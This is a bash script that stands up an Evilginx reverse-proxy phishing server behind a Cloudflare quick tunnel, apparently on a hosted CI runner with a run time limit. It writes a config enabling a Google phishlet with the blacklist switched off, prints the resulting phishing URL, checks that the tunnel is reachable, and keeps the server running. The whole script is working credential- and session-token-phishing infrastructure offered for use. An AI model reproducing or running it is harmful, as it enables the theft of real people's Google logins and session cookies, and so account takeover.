#!/usr/bin/env bash
set -euo pipefail
LIMIT=${RUN_LIMIT_MINUTES:-270}
PHISHLETS_DIR="$(pwd)/phishlets"
EVILGINX=/usr/local/bin/evilginx
CLOUDFLARED=/usr/local/bin/cloudflared
if [ "$(id -u)" = "0" ]; then SUDO=""; else SUDO="sudo"; fi

pkill -f evilginx 2>/dev/null || true

echo "--- starting tunnel first ---"
nohup "$CLOUDFLARED" tunnel --url https://localhost:443 --no-tls-verify > cloudflared.log 2>&1 &
URL=""
for i in $(seq 1 60); do
  URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' cloudflared.log | head -n1 || true)
  [ -n "$URL" ] && break
  sleep 2
done
[ -n "$URL" ] && echo "PHISH_URL=$URL" || { echo "NO_TUNNEL_URL_FOUND"; tail -n 30 cloudflared.log; }
HOST="${URL#https://}"

echo "--- restarting tunnel with origin SNI=$HOST ---"
pkill -f cloudflared 2>/dev/null || true
sleep 2
nohup "$CLOUDFLARED" tunnel --url https://localhost:443 --no-tls-verify --origin-server-name "$HOST" > cloudflared.log 2>&1 &
sleep 3

echo "--- writing evilginx config (enable google) ---"
$SUDO mkdir -p /root/.evilginx
echo "{\"phishlets\":{\"google\":{\"enabled\":true,\"hostname\":\"$URL\",\"unauth_url\":\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\"}},\"blacklist\":{\"enabled\":false,\"ip_addresses\":[],\"ip_masks\":[]}}" | $SUDO tee /root/.evilginx/config.json >/dev/null

echo "--- starting evilginx (headless via fifo) ---"
rm -f /tmp/eg_in; mkfifo /tmp/eg_in
( sleep 7; echo "config domain $HOST"; sleep 1; echo "config ipv4 external 203.0.113.7"; sleep 1; tail -f /dev/null ) > /tmp/eg_in &
"$SUDO" "$EVILGINX" -p "$PHISHLETS_DIR" -developer < /tmp/eg_in 2>&1 | tee evilginx.log &

echo "--- waiting for :443 (up to 60s) ---"
BOUND=0
for i in $(seq 1 30); do
  if (exec 3<>/dev/tcp/127.0.0.1/443) 2>/dev/null; then exec 3>&-; BOUND=1; break; fi
  sleep 2
done
echo "PORT443_BOUND=$BOUND"
echo "--- tunnel/edge probe (from runner) ---"
curl -sS -m 12 -o /tmp/edge.out -w 'EDGE_HTTP:%{http_code}\n' "$URL/" 2>&1 || echo "EDGE_PROBE_FAIL"
head -c 200 /tmp/edge.out 2>/dev/null || true
echo ""

echo "=== streaming evilginx output ==="
trap 'kill %4 %3 %2 %1 2>/dev/null || true' EXIT
for i in $(seq 1 "$((LIMIT * 6))"); do sleep 10; done
